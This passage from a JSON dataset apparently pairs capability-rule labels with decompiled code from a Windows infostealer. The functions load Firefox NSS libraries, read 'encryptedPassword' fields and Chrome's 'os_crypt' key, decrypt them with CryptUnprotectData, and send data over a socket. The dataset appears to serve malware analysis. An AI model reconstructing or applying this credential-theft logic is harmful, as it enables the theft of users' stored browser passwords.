iVar1;\n                    uVar4 = fcn.004033bf(\"encryptedPassword\");\n                    puVar5 = &var_7ch;\n                    fcn.00402f22(puVar5);\n                    fcn.00409ef0(puVar5, uVar4);\n                    fcn.00405ea5(pcVar6, iVar2);\n                    fcn.00405ea5();\n                    fcn.0040b15e(var_50h, &var_84h);\n                    fcn.0040b15e(var_4ch, &var_8ch);\n                    uVar4 = fcn.0040309d(&var_40h);\n                    fcn.00403437(uVar4);\n                    fcn.00405ea5();\n                    puVar5 = &var_44h;\n                    var_40h = 0;\n                    uVar4 = var_84h;\n                    fcn.004033bf(var_84h);\n                    uVar3 = fcn.0040309d(uVar4);\n                    fcn.00403437(uVar3);\n                    fcn.00405ea5(uVar3, uVar4, puVar5);\n                    var_44h = 0;\n                    fcn.00405ea5();\n                    puVar5 = &var_48h;\n                    uVar4 = var_8ch;\n                    fcn.004033bf(var_8ch);\n                    uVar3 = fcn.0040309d(uVar4);\n                    fcn.00403437(uVar3);\n                    fcn.00405ea5(uVar3, uVar4, puVar5);\n                    var_48h = 0;\n                    fcn.00405ea5();\n                    var_54h = 4;\n                    puVar5 = &var_60h;\n                    fcn.00401f95(puVar5);\n                    fcn.00401fcb(puVar5);\n                    fcn.00405ea5();\n                    fcn.00405ea5();\n                    fcn.00405ea5();\n                    fcn.004013ef();\n                    iVar1 = iVar1 + -1;\n                    uVar4 = lpNewFileName;\n                    iVar2 = iVar1;\n                }\n                iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(uVar4);\n                if (iVar1 != 0) {\n                    puVar5 = &lpNewFileName;\n                    fcn.0040362d(puVar5);\n                    fcn.0040ff0b(puVar5);\n                }\n                (**(var_1ch + 0x84))(var_94h);\n                (**(var_1ch + 0x6c))();\n                fcn.00403036();\n            }\n            fcn.0040feed(uVar7, uVar8);\n            fcn.00405ea5();\n            lpNewFileName = 0;\n            fcn.00405ea5();\n            lpExistingFileName = 0;\n            fcn.00405ea5();\n            fcn.00405ea5();\n            in_ECX = var_1ch;\n        }\n        else {\n            fcn.00405ea5();\n            fcn.00405ea5();\n        }\n        var_8h = 0;\n    }\n    fcn.0040b627();\n    uVar4 = 1;\n    fcn.00405ea5();\ncode_r0x0040abea:\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return uVar4;\n}\n",
        "token_count": 2367
    },
    "0040b15e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pcbBinary\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: lpString2\n\nvoid __cdecl fcn.0040b15e(uint pszString, uint *arg_ch)\n\n{\n    int32_t extraout_ECX;\n    uint pbBinary;\n    uint uStack64;\n    uint *puStack60;\n    uint *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint *var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    uint pcbBinary;\n    \n    pcbBinary = 0x40b16b;\n    fcn.00401190();\n    var_10h = pszString;\n    pcbBinary = 0x1fa0;\n    var_14h = 0x40b181;\n    uStack44 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    var_14h = 0x1fa0;\n    var_1ch = &fcn.0040b15e::pbBinary;\n    var_18h = NULL;\n    puStack36 = 0x40b193;\n    fcn.00401052();\n    var_1ch = &fcn.0040b15e::pcbBinary;\n    var_14h = 0;\n    var_18h = NULL;\n    puStack36 = &fcn.0040b15e::pbBinary;\n    uStack40 = 1;\n    uStack48 = pszString;\n    iStack52 = 0x40b1af;\n    (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)();\n    var_18h = &fcn.0040b15e::pbBinary;\n    var_1ch = NULL;\n    var_14h = pcbBinary;\n    puStack56 = &fcn.0040b15e::var_10h;\n    iStack52 = 0;\n    puStack60 = &fcn.0040b15e::var_1ch;\n    lpString2 = 0;\n    var_8h = 0;\n    var_10h = 0;\n    uStack64 = 0x40b1d6;\n    (**(extraout_ECX + 0x70))();\n    *(var_8h + lpString2) = 0;\n    iStack52 = 0x40b1ed;\n    puStack56 = fcn.00405eb4();\n    iStack52 = lpString2;\n    *arg_ch = puStack56;\n    puStack60 = 0x40b1fc;\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)();\n    return;\n}\n",
        "token_count": 637
    },
    "0040b526": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040b526(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040fa42();\n    if ((0x17c < iVar1 - 0x26cU) && (0xed8 < iVar1 - 0x1838U)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 80
    },
    "0040b67e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "check if file exists",
            "get common file path",
            "set current directory"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b67e(uint lpPathName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpBuffer;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint pszPath;\n    \n    uVar3 = 0;\n    fcn.00401052(&lpBuffer, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryW)(0x104, &lpBuffer);\n    (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(lpPathName);\n    fcn.0040346a(0x414684);\n    fcn.0040362d(&lpPathName);\n    fcn.0040346a(L\"nss3.dll\");\n    fcn.0040362d(&lpPathName);\n    fcn.0040346a(L\"msvcr120.dll\");\n    fcn.0040362d(&lpPathName);\n    fcn.0040346a(L\"msvcp120.dll\");\n    fcn.0040362d(&lpPathName);\n    fcn.0040346a(L\"mozglue.dll\");\n    fcn.0040362d(&lpPathName);\n    fcn.0040346a(L\"softokn3.dll\");\n    fcn.0040362d(&lpPathName);\n    fcn.0040346a(L\"msvcp\");\n    fcn.0040362d(&lpPathName);\n    fcn.0040346a(L\"msvcr\");\n    iVar4 = 0x5a;\n    var_8h = 0x5a;\n    do {\n        fcn.0040362d(&var_18h);\n        uVar5 = 0x415788;\n        iVar2 = var_8h;\n        fcn.00403272(var_8h);\n        fcn.0040346a(iVar2);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar2, uVar5);\n        if (iVar2 != 0) {\n            fcn.00403437(&pszPath);\n            fcn.00405ea5();\n            break;\n        }\n        var_8h = var_8h + 10;\n        fcn.00405ea5();\n        pszPath = 0;\n    } while (var_8h != 0x96);\n    do {\n        fcn.0040362d(&var_14h);\n        uVar5 = 0x415788;\n        iVar2 = iVar4;\n        fcn.00403272(iVar4);\n        fcn.0040346a(iVar2);\n        iVar2 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath, iVar2, uVar5);\n        if (iVar2 != 0) {\n            fcn.00403437(&pszPath);\n            fcn.00405ea5();\n            break;\n        }\n        iVar4 = iVar4 + 10;\n        fcn.00405ea5();\n        pszPath = 0;\n    } while (iVar4 != 0x96);\n    pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n    uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(var_10h);\n    *(in_ECX + 0xa8) = uVar5;\n    uVar5 = (*pcVar1)(var_ch);\n    *(in_ECX + 0xac) = uVar5;\n    uVar5 = (*pcVar1)(var_20h);\n    *(in_ECX + 0xb0) = uVar5;\n    uVar5 = (*pcVar1)(var_24h);\n    *(in_ECX + 0xb4) = uVar5;\n    iVar4 = (*pcVar1)(var_1ch);\n    *(in_ECX + 0xb8) = iVar4;\n    if ((((*(in_ECX + 0xac) != 0) && (*(in_ECX + 0xb0) != 0)) && (*(in_ECX + 0xb4) != 0)) && (iVar4 != 0)) {\n        uVar3 = fcn.00410969(*(in_ECX + 0xb4));\n        *(in_ECX + 0x68) = uVar3;\n        uVar3 = fcn.00410969();\n        *(in_ECX + 0x80) = uVar3;\n        uVar3 = fcn.00410969();\n        *(in_ECX + 0x7c) = uVar3;\n        uVar3 = fcn.00410969();\n        *(in_ECX + 0x70) = uVar3;\n        uVar3 = fcn.00410969();\n        *(in_ECX + 0x74) = uVar3;\n        uVar3 = fcn.00410969();\n        *(in_ECX + 0x78) = uVar3;\n        uVar3 = fcn.00410969();\n        *(in_ECX + 0x6c) = uVar3;\n        uVar3 = fcn.00410969();\n        *(in_ECX + 0x84) = uVar3;\n        uVar3 = fcn.00410969();\n        *(in_ECX + 0x88) = uVar3;\n        (*_sym.imp.KERNEL32.dll_SetCurrentDirectoryW)(&lpBuffer);\n        uVar3 = 1;\n    }\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    return uVar3;\n}\n",
        "token_count": 1351
    },
    "0040c118": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040c118(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint lpString1;\n    uint var_ch;\n    uint var_8h;\n    uint hKey;\n    \n    var_8h = 0x104;\n    var_ch = 1;\n    fcn.00401052(&lpString1, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\\");\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, param_1);\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, &lpString1, 0, 1, &hKey);\n    if (iVar1 == 0) {\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, L\"Path\", 0, &var_ch, param_2, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 265
    },
    "0040ca78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040ca78(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint var_4h;\n    \n    iVar1 = fcn.0040cd49();\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040cd14();\n        if ((((iVar1 == 0) ||\n             (iVar1 = fcn.0040cafc(in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, 0, \n                                   arg_1ch, arg_20h),  iVar1 == 0)) &&\n            (iVar1 = fcn.0040cafc(in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, 0, arg_1ch\n                                  , arg_20h),  iVar1 == 0)) &&\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar2 == -0x7ff6fff5)) {\n            iVar1 = 0;\n        }\n        fcn.0040ce83();\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 343
    },
    "0040cafc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040cafc(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint dwFlags, int32_t *arg_1ch, uint *arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint pDataIn;\n    uint var_14h;\n    uint pOptionalEntropy;\n    uint var_ch;\n    uint pDataOut;\n    uint hMem;\n    \n    pOptionalEntropy = 0;\n    var_ch = 0;\n    iVar1 = (*_sym.imp.CRYPT32.dll_CryptUnprotectData)(&pDataIn, 0, &pOptionalEntropy, 0, 0, dwFlags, &pDataOut);\n    if (iVar1 != 0) {\n        *arg_20h = pDataOut;\n        arg_8h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, pDataOut);\n        *arg_1ch = arg_8h;\n        if (arg_8h != 0) {\n            fcn.0040102c(arg_8h, hMem, *arg_20h);\n        }\n        (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n    }\n    return iVar1;\n}\n",
        "token_count": 281
    },
    "0040cd14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0040cd14(uint param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = *0x419150;\n    while( true ) {\n        if (puVar2 == 0x419150) {\n            return NULL;\n        }\n        iVar1 = fcn.00401000(param_1, puVar2 + 2, 0x10);\n        if (iVar1 == 0) break;\n        puVar2 = *puVar2;\n    }\n    return puVar2;\n}\n",
        "token_count": 126
    },
    "0040ce4d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ce4d(uint32_t uBytes, uint32_t arg_ch)\n\n{\n    int32_t *in_ECX;\n    int32_t arg_8h;\n    \n    arg_8h = 0;\n    if ((uBytes | arg_ch) != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, uBytes);\n        if (arg_8h != 0) {\n            fcn.0040102c(arg_8h, *in_ECX, uBytes);\n        }\n    }\n    *in_ECX = arg_8h;\n    return;\n}\n",
        "token_count": 143
    },
    "0040ced9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ced9(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint hMem;\n    \n    uVar3 = 0;\n    iVar1 = fcn.0040cba8(&var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = fcn.0040cb67();\n    if (iVar1 == 0) goto code_r0x0040cf49;\n    iVar2 = fcn.004010d5(iVar1, L\"\\\"os_crypt\\\":{\\\"encrypted_key\\\":\\\"\");\n    if (iVar2 == 0) {\ncode_r0x0040cf40:\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x416050;\n        iVar2 = fcn.004010d5(iVar2 + 0x3a);\n        if (iVar2 == 0) goto code_r0x0040cf40;\n        uVar3 = fcn.0040c9f2(uVar3, arg_10h, arg_14h);\n    }\n    (*_sym.imp.KERNEL32.dll_LocalFree)(iVar1);\ncode_r0x0040cf49:\n    (*_sym.imp.KERNEL32.dll_LocalFree)(hMem);\n    return uVar3;\n}\n",
        "token_count": 327
    },
    "0040dc99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040dc99(void)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    \n    iVar1 = fcn.0040f69f();\n    return iVar1 != 0;\n}\n",
        "token_count": 49
    },
    "0040e891": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create a process with modified I/O handles and window"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.0040e891(uint lpApplicationName, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_54h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.00401052(&var_54h, 0, 0x44);\n    var_18h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = arg_14h;\n    var_24h._0_2_ = 0;\n    var_54h = 0x44;\n    var_28h = 0x101;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(lpApplicationName, 0, 0, 0, 1, 0x10, 0, 0, &var_54h, &var_10h);\n    if (iVar1 != 0) {\n        *0x41955c = var_10h;\n    }\n    fcn.00405ea5();\n    return iVar1 != 0;\n}\n",
        "token_count": 286
    },
    "0040f1da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f1da(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t arg_8h_00;\n    uint in_EDX;\n    \n    uVar1 = *0x4198b4;\n    arg_8h_00 = fcn.00401085(0x2000);\n    fcn.0040102c(arg_8h_00, &arg_ch, 4);\n    fcn.0040102c(arg_8h_00 + 4, &arg_8h, 4);\n    fcn.0040102c(arg_8h_00 + 8, in_EDX, arg_8h);\n    (*_sym.imp.WS2_32.dll_send)(uVar1, arg_8h_00, arg_8h + 8, 0);\n    fcn.00401099(arg_8h_00);\n    return;\n}\n",
        "token_count": 211
    },
    "0040f56d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040f56d(uint param_1)\n\n{\n    int32_t iVar1;\n    uint Name;\n    uint ReferencedDomainName;\n    uint peUse;\n    uint cchName;\n    uint cchReferencedDomainName;\n    uint pIdentifierAuthority;\n    uint var_8h;\n    int32_t pSid;\n    \n    cchReferencedDomainName = 0x10;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    var_8h._0_2_ = 0x500;\n    fcn.00401052(&Name, 0, 0x208);\n    cchName = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &pSid);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                          (0, pSid, &Name, &cchName, &ReferencedDomainName, &cchReferencedDomainName, &peUse);\n        if (iVar1 != 0) goto code_r0x0040f5f7;\n    }\n    (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0040f5f7:\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    fcn.004035e5(&Name);\n    return param_1;\n}\n",
        "token_count": 374
    },
    "0040f76b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f76b(uint param_1, uint param_2)\n\n{\n    uint var_208h;\n    \n    fcn.00401052(&var_208h, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathW)(0, &var_208h, param_2, 0);\n    fcn.004035e5(&var_208h);\n    return param_1;\n}\n",
        "token_count": 103
    },
    "0040f93f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040f95c)\n\nuint __fastcall fcn.0040f93f(uint param_1)\n\n{\n    code **ppcVar1;\n    uint uVar2;\n    uint *arg_8h;\n    uint arg_8h_00;\n    code *pcVar3;\n    uint arg_8h_01;\n    uint uVar4;\n    uint var_58h;\n    uint var_48h;\n    uint var_38h;\n    code *var_18h;\n    code *pcStack24;\n    code *pcStack20;\n    code *pcStack16;\n    uint var_8h;\n    code *var_4h;\n    \n    pcVar3 = 0x80000000;\n    ppcVar1 = cpuid(0x80000000);\n    var_18h = *ppcVar1;\n    pcStack24 = ppcVar1[1];\n    pcStack16 = ppcVar1[2];\n    pcStack20 = ppcVar1[3];\n    var_8h = param_1;\n    var_4h = var_18h;\n    if (0x7fffffff < var_18h) {\n        do {\n            if (pcVar3 == NULL) {\n                ppcVar1 = cpuid_basic_info(0);\n            }\n            else if (pcVar3 == 0x1) {\n                ppcVar1 = cpuid_Version_info(1);\n            }\n            else if (pcVar3 == 0x2) {\n                ppcVar1 = cpuid_cache_tlb_info(2);\n            }\n            else if (pcVar3 == 0x3) {\n                ppcVar1 = cpuid_serial_info(3);\n            }\n            else if (pcVar3 == 0x4) {\n                ppcVar1 = cpuid_Deterministic_Cache_Parameters_info(4);\n            }\n            else if (pcVar3 == 0x5) {\n                ppcVar1 = cpuid_MONITOR_MWAIT_Features_info(5);\n            }\n            else if (pcVar3 == 0x6) {\n                ppcVar1 = cpuid_Thermal_Power_Management_info(6);\n            }\n            else if (pcVar3 == 0x7) {\n                ppcVar1 = cpuid_Extended_Feature_Enumeration_info(7);\n            }\n            else if (pcVar3 == 0x9) {\n                ppcVar1 = cpuid_Direct_Cache_Access_info(9);\n            }\n            else if (pcVar3 == 0xa) {\n                ppcVar1 = cpuid_Architectural_Performance_Monitoring_info(10);\n            }\n            else if (pcVar3 == 0xb) {\n                ppcVar1 = cpuid_Extended_Topology_info(0xb);\n            }\n            else if (pcVar3 == 0xd) {\n                ppcVar1 = cpuid_Processor_Extended_States_info(0xd);\n            }\n            else if (pcVar3 == 0xf) {\n                ppcVar1 = cpuid_Quality_of_Service_info(0xf);\n            }\n            else if (pcVar3 == 0x80000002) {\n                ppcVar1 = cpuid_brand_part1_info(0x80000002);\n            }\n            else if (pcVar3 == 0x80000003) {\n                ppcVar1 = cpuid_brand_part2_info(0x80000003);\n            }\n            else if (pcVar3 == reloc.WS2_32.dll_connect) {\n                ppcVar1 = cpuid_brand_part3_info(0x80000004);\n            }\n            else {\n                ppcVar1 = cpuid(pcVar3);\n            }\n            var_18h = *ppcVar1;\n            pcStack24 = ppcVar1[1];\n            pcStack16 = ppcVar1[2];\n            pcStack20 = ppcVar1[3];\n            if (pcVar3 == 0x80000002) {\n                arg_8h = &var_58h;\ncode_r0x0040f9cb:\n                fcn.0040102c(arg_8h, &var_18h, 0x10);\n            }\n            else {\n                if (pcVar3 == 0x80000003) {\n                    arg_8h = &var_48h;\n                    goto code_r0x0040f9cb;\n                }\n                if (pcVar3 == reloc.WS2_32.dll_connect) {\n                    arg_8h = &var_38h;\n                    goto code_r0x0040f9cb;\n                }\n            }\n            pcVar3 = pcVar3 + 1;\n        } while (pcVar3 <= var_4h);\n    }\n    arg_8h_00 = fcn.00401085(0x200);\n    fcn.0040102c(arg_8h_00, &var_58h, 0x40);\n    uVar2 = var_8h;\n    arg_8h_01 = arg_8h_00;\n    uVar4 = var_8h;\n    fcn.004033bf(arg_8h_00);\n    fcn.0040309d(arg_8h_01);\n    fcn.00405ea5(arg_8h_01, uVar4);\n    fcn.00401099(arg_8h_00);\n    return uVar2;\n}\n",
        "token_count": 1192
    },
    "0040fcb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0040fcb8(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char16_t *arg_ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (*0x54e094 == 0) {\n        puVar1 = fcn.004035e5(0x416d38);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, *puVar1, 0, 0x101, &phkResult);\n        fcn.00405ea5();\n        if (iVar2 == 0) {\n            arg_ch = L\"MachineGuid\";\n            uVar3 = fcn.004035e5(L\"MachineGuid\");\n            fcn.00410fc3(uVar3, arg_ch);\n            fcn.00405ea5();\n            fcn.00410fae();\n        }\n        uVar3 = fcn.0040607a();\n        fcn.00402e93(uVar3);\n        fcn.00403036();\n        puVar1 = param_1;\n    }\n    else {\n        puVar1 = 0x54e090;\n    }\n    fcn.00402e93(puVar1);\n    fcn.00403036();\n    fcn.00410fae();\n    return param_1;\n}\n",
        "token_count": 362
    },
    "0041002b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041002b(uint param_1)\n\n{\n    int16_t iVar1;\n    int16_t *lpString2;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    int16_t *arg_ch;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpRootPathName;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = param_1;\n    lpString2 = fcn.00405f53();\n    var_1ch = 0;\n    var_18h = 5;\n    var_20h = 5;\n    fcn.004019f6();\n    arg_ch = lpString2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsW)(0x104);\n    if (0x104 < uVar2) {\n        lpString2 = fcn.00405f53();\n        (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsW)(uVar2, lpString2);\n    }\n    iVar1 = *lpString2;\n    while (iVar1 != 0) {\n        lpRootPathName = 0;\n        uVar3 = fcn.004035e5(lpString2);\n        fcn.00403437(uVar3);\n        fcn.00405ea5();\n        var_4h = 0;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(lpRootPathName);\n        arg_8h = &lpRootPathName;\n        var_10h = uVar3;\n        fcn.0040362d(arg_8h);\n        fcn.00401903(arg_8h, arg_ch, uVar3);\n        iVar4 = fcn.00403261();\n        lpString2 = lpString2 + iVar4 + 1;\n        fcn.00405ea5();\n        lpRootPathName = 0;\n        param_1 = var_8h;\n        iVar1 = *lpString2;\n    }\n    fcn.004013a8(&var_24h);\n    if (var_24h != 0) {\n        fcn.00401b00(var_24h);\n    }\n    return param_1;\n}\n",
        "token_count": 537
    },
    "00410620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "access PEB ldr_data",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00410620(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t in_FS_OFFSET;\n    \n    puVar3 = *(*(in_FS_OFFSET + 0x30) + 0xc) + 0x14;\n    puVar2 = *puVar3;\n    while( true ) {\n        if (puVar2 == puVar3) {\n            return 0;\n        }\n        iVar1 = fcn.004106de();\n        if (iVar1 == 0) break;\n        puVar2 = *puVar2;\n    }\n    return puVar2[4];\n}\n",
        "token_count": 146
    },
    "004106c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004106c4(int16_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if ((*param_1 != 0x5a4d) || (piVar1 = *(param_1 + 0x1e) + param_1,  *piVar1 != 0x4550)) {\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 99
    },
    "004106de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004106de(int16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    \n    puVar3 = 0x414950;\n    if (*param_1 != 0) {\n        do {\n            uVar1 = *puVar3;\n            if (uVar1 == 0) {\n                return 1;\n            }\n            uVar2 = *(param_1 + -0x20a4a8 + puVar3);\n            if (uVar1 >= uVar2 && uVar1 != uVar2) {\n                return 0xffffffff;\n            }\n            if (uVar1 < uVar2) {\n                return 1;\n            }\n            puVar3 = puVar3 + 1;\n        } while (*(param_1 + -0x20a4a8 + puVar3) != 0);\n        if (*puVar3 == 0) {\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 232
    },
    "004107c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004107c4(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint var_2ch;\n    uint var_24h;\n    code *var_1ch;\n    code *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    code *var_8h;\n    int32_t var_4h;\n    \n    var_10h = param_1;\n    fcn.00410620(param_1);\n    pcVar1 = fcn.00410969();\n    var_1ch = pcVar1;\n    fcn.00410620();\n    var_14h = fcn.00410969();\n    fcn.00410620();\n    var_8h = fcn.00410969();\n    fcn.00410620();\n    var_18h = fcn.00410969();\n    piVar2 = fcn.0041064e(1, 0);\n    if (piVar2 != NULL) {\n        for (; piVar2[3] != 0; piVar2 = piVar2 + 5) {\n            var_4h = 0;\n            (*var_14h)(&var_24h, piVar2[3] + param_1);\n            iVar3 = (*pcVar1)(0, 0, &var_24h, &var_4h);\n            if ((iVar3 < 0) 